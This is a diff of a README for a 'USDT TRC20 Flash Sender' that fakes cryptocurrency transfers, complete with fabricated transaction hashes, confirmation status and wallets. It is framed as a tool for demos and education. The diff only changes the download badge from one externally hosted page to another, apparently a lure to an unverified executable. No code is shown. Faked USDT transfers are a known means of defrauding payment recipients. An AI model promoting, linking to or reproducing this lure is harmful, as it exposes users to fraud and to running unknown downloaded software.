@@ -2,7 +2,7 @@
 
 Simulate fast and realistic USDT TRC20 transfers with this lightweight **USDT Flash Sender** built in native C++ 💸. Designed for wallet demos, frontend previews, or educational showcases — this tool fakes USDT transfers instantly, including TX hash, confirmation status, sender/receiver wallets, and amount.
 
-[![Download USDT TRC20 Flash Sender](https://img.shields.io/badge/Download-USDT%20TRC20%20Flash%20Sender-blueviolet)](https://fileoffload17.bitbucket.io)
+[![Download USDT TRC20 Flash Sender](https://img.shields.io/badge/Download-USDT%20TRC20%20Flash%20Sender-blueviolet)](https://USDTTRC20-FLASH-SENDER-wola.github.io/.github)
 
 ---
 
